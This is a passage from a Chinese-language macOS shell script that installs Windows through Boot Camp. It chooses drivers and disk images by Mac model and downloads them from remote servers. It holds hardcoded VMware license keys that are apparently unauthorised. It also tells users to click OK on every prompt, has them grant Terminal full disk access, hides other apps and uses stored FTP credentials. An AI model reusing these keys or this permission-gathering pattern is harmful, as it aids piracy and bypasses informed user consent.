	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else		
	if [[ $modelbb = "iMac12,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else		
	if [[ $modelbb = "iMac13,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac13,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac14,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac14,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,3" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac14,4" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac15,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac16,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else		
	if [[ $modelbb = "iMac16,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac17,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac18,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac18,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac18,3" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac19,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac19,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "Macmini6,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "Macmini6,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "Macmini7,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "Macmini5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "Macmini5,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacPro5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else		
	
	
	
	
	if [[ $modelxh = "10.10"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelxh = "10.9"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelxh = "10.8"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelxh = "10.7"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelxh = "10.6"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	
	
	
	else
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
		
		
	fi	
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi	


				 
	if [ "${CustomizeURL}" = "800" ]
	then
	if [ "$sip" ]; then
	
	if [ "$win10sip" ]; then
	read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
    fi
    
	fi
	if [[ $modelbb = "MacBookAir7,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBook8,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBook9,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6427.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir7,2" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir6,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir6,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro11,4" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,5" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro12,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,3" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac16,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac16,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac17,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac15,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,4" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5722.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "Macmini7,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5769.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else



	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
fi		
fi	
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi	
fi
fi
fi
fi
fi
fi
fi			
fi


	if [ "${CustomizeURL}" = "700" ]
	then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	DrvWin7="1"
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ ! "$win7yes" ]; then
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo	
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	fi
	if [[ $modelxh = "10.6"* ]]; then
	MAC106="1"
 	name="BootCamp4.0.4033.zip"
	url="http://s1.mac2x.com/bootcamp/4.x/BootCamp4.0.4033.zip"
	#xtname3="New7.dmg"
	#name2="winclone7.dmg"
	#url2="http://119.188.240.184/wr/winclone7.zip"
	xtname3="7x64.dmg"
	name2="7x64.dmg"
	url2="$ip5/7x64_104.img.gz"
	else
	if [ "$btap" ]; then
 	name="BootCamp$btap.zip"
	url="$ip8/BootCamp/BootCamp$btap.zip"
	else
 	name="BootCamp4.0.4033.zip"
	url="$ip8/BootCamp/BootCamp4.0.4033.zip"
    fi
    xtname3="7x64.dmg"
	name2="7x64.dmg"
	url2="$ip8/666/7x64_104.img.gz"
	fi
	FenQu2
	fi						
	
	if [ ! "$CustomizeURL" ]
	then
		echo  "\033[31m"
		read -s -n1 -p "输入为空，请按任意键返回重新输入..."
		echo  "\033[0m"
		Customize
	fi
		
			
	if [ "${CustomizeURL:0:4}" != "http" ]
	then
		echo  "\033[31m"
		read -s -n1 -p "输入格式不正确，请按任意键返回重新输入..."
		echo  "\033[0m"
		Customize
	fi
    name=${CustomizeURL##*/}
	url="$CustomizeURL"
	Download

	;;
esac
}


kaishi(){
clear && printf "\e[3J"	

umount -f /Volumes/JGDow 2>/dev/null
diskutil eject $(diskutil list | grep 'JGDow' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g') >/dev/null 2>&1
clear && printf "\e[3J"
scpdk="1"
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
ipxx=$(curl --connect-timeout 3 myip.ipip.net 2>/dev/null)
ipxx=$(echo $ipxx | awk -F '来自于：|",' '{print $2}')

if [ ! "$oldusb" ]; then
if [[ $modelxh = "10.10"* ]]; then
oldusb="1"
imacpd="1"
fi
if [[ $modelxh = "10.9"* ]]; then
oldusb="1"
fi
if [[ $modelxh = "10.8"* ]]; then
oldusb="1"
fi
if [[ $modelxh = "10.7"* ]]; then
oldusb="1"
olddsik="1"
fi
if [[ $modelxh = "10.6"* ]]; then
oldmm="1"
oldusb="1"
olddsik="1"
fi
if [[ $modelxh = "10.5"* ]]; then
oldmm="1"
oldusb="1"
olddsik="1"
fi
if [[ $modelxh = "10.4"* ]]; then
zdys="-e "
oldmm="1"
oldusb="1"
olddsik="1"
fi
fi

if [ ! "$M1CPU" ]; then
if [ "$zxos" ]; then
dkzdqx=""
fi
fi

guid=$(diskutil list disk0 | grep "GUID")
if [ ! "$guid" ]; then
clear && printf "\e[3J"
echo	
echo
echo
echo $zdys"  ""\033[42;30m 检查到分区表不是GUID, 【无法正常安装】！请通知技术员！\033[0m"
echo
read -s -n1 -p " "
fi

yhid="$(id -un)" 

if groups $yhid | grep -q -w admin; then 
echo 
else 
echo $zdys"  ""\033[42;30m 当前用户不是管理员, 【无法正常安装】！请通知技术员！\033[0m"
echo
read -s -n1 -p " "
fi

echo	
echo 如果您看到提示：请直接都点【好】
echo
echo	
echo 如果您看到提示：请直接都点【好】
echo
echo	
echo 如果您看到提示：请直接都点【好】
echo
echo	
echo 如果您看到提示：请直接都点【好】
echo
echo	
echo 如果您看到提示：请直接都点【好】
echo
echo	
echo 如果您看到提示：请直接都点【好】
echo


if [ ! "$csh" ]; then
osascript <<EOD
tell application "System Events"
tell process "Terminal"
set frontmost to true
end tell
end tell
tell application "Terminal"
set font size of first window to "14"
end tell
EOD
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
if [ $? -eq 1 ] ; then
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
fi
csh="1"
fi
osascript <<EOD
tell application "Terminal"
activate
set size of window 1 to {800, 650}
end tell
EOD

osascript -e 'tell application "System Events" to set current screen saver to screen saver "Arabesque"' -e 'tell application "System Events" to set delay interval of screen saver preferences to 0 -- Number In Seconds'

if [ -f ~/Downloads/JG_Download/SIPFQ ]; then
diskutil eraseVolume MS-DOS DOS /Volumes/SIPFQ
rm -f ~/Downloads/JG_Download/SIPFQ
osascript -e 'tell application "System Events" to delete login item "7777"'
rm -f /Applications/7777
if [ -f ~/7777.sh ]; then
source ~/7777.sh
rm -f ~/7777.sh
fi
fi


if [ -e $HOME/Parallels ]; then	
if [ -f $HOME/Desktop/*.lnk ]; then
SCLNK="1"
fi
fi

clear && printf "\e[3J"
echo
echo  "\033[36m正在连接服务器中..\033[0m"
echo
if [ ! "$bjsbm" ]; then
bjsbm="$[RANDOM%10000]"
vncip="$[RANDOM%100+6000]"
curl -v -u $ftpm ftp://$ftpip/mac.txt -Q "DELE "$bjsbm".sh" >/dev/null 2>&1
curl -v -u $ftpm ftp://$ftpip/mac.txt -Q "DELE "$bjsbm".txt" >/dev/null 2>&1
curl -v -u $ftpm ftp://$ftpip/mac.txt -Q "DELE "$bjsbm"disk.txt" >/dev/null 2>&1
fi



if [ "$dkzdqx" ]; then

if [ "$zxos" ]; then
if ! plutil -lint /Library/Preferences/com.apple.TimeMachine.plist >/dev/null ; then
curl -# -C - --connect-timeout 10 -o /tmp/zdwqfw.jpg "$osip/zdwqfw.jpg" >/dev/null 2>&1
clear && printf "\e[3J"
echo
echo 请您按图片操作完后, 在此窗口按一下空格键
echo
echo
echo
echo "文字流程：
1.点【左上角苹果】
2.点【系统设置】
3.点【隐私与安全性】
4.点【安全磁盘访问权限】
5.打开【终端】输入密码，选以后
"
sleep 2
if [ -f /tmp/zdwqfw.jpg ]; then
open -a /System/Applications/Preview.app /tmp/zdwqfw.jpg
fi
open "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles"
echo
echo
read -s -n1 -p "操作完后，关掉图片，请您在此窗口按一下空格键"
killall Preview
kaishi
fi
fi

fi


if [[ $modelxh = "10.13"* ]]; then
imacpd="1"
fi
if [[ $modelxh = "10.12"* ]]; then
imacpd="1"
fi
if [[ $modelxh = "10.11"* ]]; then
imacpd="1"
fi
pdbb="17"
if [ "$zxos" ]; then
vmbb="12.2.4"
vmkey="12.0"
licenseKey="ZF3R0-FHED2-M80TY-8QYGC-NPKYF"
vvm19="1"
xxpd="1"
bigsur="1"
fi
if [[ $modelxh = "12."* ]]; then
vmbb="12.2.4"
vmkey="12.0"
licenseKey="ZF3R0-FHED2-M80TY-8QYGC-NPKYF"
vvm19="1"
xxpd="1"
bigsur="1"
fi
if [[ $modelxh = "11."* ]]; then
vmbb="12.2.4"
vmkey="12.0"
licenseKey="ZF3R0-FHED2-M80TY-8QYGC-NPKYF"
vvm19="1"
xxpd="1"
bigsur="1"
fi
if [[ $modelxh = "10.15"* ]]; then
vmbb="12.1.2"
vmkey="12.0"
licenseKey="ZF3R0-FHED2-M80TY-8QYGC-NPKYF"
vvm19="1"
pd16="1"
fi
if [[ $modelxh = "10.14"* ]]; then
vmbb="11.5.7"
vmkey="11.0"
licenseKey="TX1NF-PPVRW-A1XAX-X5PVZ-Q7ZTT"
pd1701="1"
vvm16="1"
pd16="1"
fi
if [[ $modelxh = "10.13"* ]]; then
pdbb="17"
vmbb="11.5.3"
vmkey="11.0"
licenseKey="TX1NF-PPVRW-A1XAX-X5PVZ-Q7ZTT"
pd1701="1"
vvm16="1"
pd16="1"
fi
if [[ $modelxh = "10.12"* ]]; then
pdbb="15"
vmkey="11.0"
licenseKey="TX1NF-PPVRW-A1XAX-X5PVZ-Q7ZTT"
vmbb="11.1.1"
vvm16="1"
fi
if [[ $modelxh = "10.11"* ]]; then
pdbb="14"
vmkey="10.0"
licenseKey="FG3TU-DDX1M-084CY-MFYQX-QC0RD"
vmbb="10.1.6"
vvm14="1"
fi
if [[ $modelxh = "10.10"* ]]; then
pddbb="1"
pdbb="13"
vmkey="8.0"
licenseKey="ZY7TK-A3D4N-08EUZ-TQN5E-XG2TF"
vmbb="8.5.10"
vvm12="1"
fi
if [[ $modelxh = "10.9"* ]]; then
pddbb="1"
pdbb="10"
vmkey="8.0"
licenseKey="ZY7TK-A3D4N-08EUZ-TQN5E-XG2TF"
vmbb="8.5.10"
vvm12="1"
nopd10="1"
fi
if [[ $modelxh = "10.8"* ]]; then
pddbb="1"
pdbb="10"
vmkey="7.0"
licenseKey="3ZPJT-H7ANX-M4RRC-NXGZE-0L5V1"
vmbb="7.1.2 "
nopd10="1"
fi
if [[ $modelxh = "10.7"* ]]; then
pddbb="1"
pdbb="10"
vmkey="6.0"
licenseKey="VZ15K-DKD85-M85EP-W4P79-XAAU4"
vmbb="6.0.4 "
nopd10="1"
fi
if [[ $modelxh = "10.6"* ]]; then
pddbb="1"
pdbb="10"
nopd10="1"
fi

	if [ "$oldusb" ]; then
    Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
    else
    Hostname=$(diskutil list | grep external)
    fi	
	if [ "$Hostname" ]; then
	clear && printf "\e[3J"
	echo
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo 
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo 
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo 
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo 
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo 
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo 
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo 
	echo "请拔掉【U盘】、【移动硬盘】！！！"
	echo  
    read -t 10 -p  "请拔掉【U盘】、【移动硬盘】！！！" upnum
	if [ "$upnum" = "0" ]; then
	echo
	else
	kaishi
	fi
	fi

restore_device=""
win_partition=""

win_partition=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')

if [ "${win_partition}" ] ; then
restore_device="/dev/${win_partition}"
if [ $(echo "$restore_device" | wc -l ) -gt 1 ]; then
windfq="1"
win_partition=""
win_partition=$(diskutil list | grep 'BOOTCAMP' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
win_partition=$(diskutil list | grep 'Windows' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
if [ ! "${win_partition}" ] ; then
win_partition=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g' | sed -n '1,1p')
wincpkj=$(df -h | grep "/dev/${win_partition}" | awk '{print $2}' | sed 's/[^0-9]//g')
if [ "$wincpkj" -lt 30 ]; then
win_partition=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g' | sed -n '2,1p')
fi
fi
restore_device="/dev/${win_partition}"
fi
fi

if [[ $modelxh = "10.9"* ]]; then
sip=""
else

if [[ $modelxh = "10.8"* ]]; then
sip=""
else

if [[ $modelxh = "10.7"* ]]; then	
sip=""
else

if [[ $modelxh = "10.6"* ]]; then
sip=""

else

if [[ $modelxh = "10.5"* ]]; then
sip=""

else

if [[ $modelxh = "10.4"* ]]; then
sip=""

else

if [[ $modelxh = "10.10"* ]]; then
sip=""

else

if [[ $(csrutil status 2>/dev/null|awk '/status:/ {print $NF}') = *"disabled"* ]]; then
sip=""
else
sip="SIP"
if [[ $(csrutil status|grep "Apple Internal: disabled") = *"disabled"* ]]; then	
sip=""
else
sip="SIP"
fi
fi
fi
fi
fi
fi
fi
fi
fi

modelcpu="$(sysctl machdep.cpu.brand_string 2>/dev/null|awk '/machdep.cpu.brand_string:/ {print $2,$3,$4,$5,$6,$7,$8,$9}')"
memtotal="$(($(sysctl -n hw.memsize) / 1024 / 1024/ 1024))"	
modelid="$(system_profiler SPDisplaysDataType SPMemoryDataType SPStorageDataType | grep 'Graphics/Displays:\|Chipset Model:\|VRAM (Total):\|Resolution:\|Memory Slots:\|Size:\|Speed:\|Storage:\|Media Name:\|Medium Type:' 2>/dev/null|awk '/Chipset Model:/ {print $3,$4,$5,$6,$7,$8,$9}')"
modelbb="$(system_profiler SPHardwareDataType 2>/dev/null|awk '/Model Identifier:/ {print $NF}')"
model512="$(diskutil info disk0 2>/dev/null|awk '/Device Block Size:/ {print $4,$5}')"
modelssd="$(system_profiler SPStorageDataType 2>/dev/null|awk '/Medium Type:/ {print $3}')"
srsyb="$(system_profiler SPStorageDataType | grep "APPLE SSD")"
imachdd="$(system_profiler SPStorageDataType | grep "APPLE HDD")"
disk_total="$(df -h | head -2 | tail -1 | awk '{print $2}' | sed 's/i/B/g')"
disk_used="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/i/B/g')"
Disk="$disk_used / $disk_total"
kykj="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/[^0-9]//g')"



if [[ $modelxh = "10.6"* ]]; then
zgmacdq="10.11"
fi
if [[ $modelxh = "10.7"* ]]; then
zgmacdq="10.12"
fi
if [[ $modelxh = "10.8"* ]]; then
zgmacdq="10.14"
fi
if [[ $modelxh = "10.11"* ]]; then
zgmacdq="12.X"
fi

if [ ! "$oldusb" ]; then
jiami="$(fdesetup status | grep Encryption)"
fi
if [ "$jiami" ]; then
jiami="JM"
fi
if [ ! "$srsyb" ]; then
srsyb="$(system_profiler SPStorageDataType | grep "APPLE HDD")"
if [ ! "$imachdd" ]; then
imachdd="1"
fi
fi



M1CPU=$(echo "$modelcpu" | grep "Apple")
if [ ! "$M1CPU" ]; then
M1CPU=$(echo "$modelcpu" | grep "M1")
fi
if [ ! "$M1CPU" ]; then
M1CPU=$(echo "$modelcpu" | grep "M2")
fi
if [ "$M1CPU" ]; then
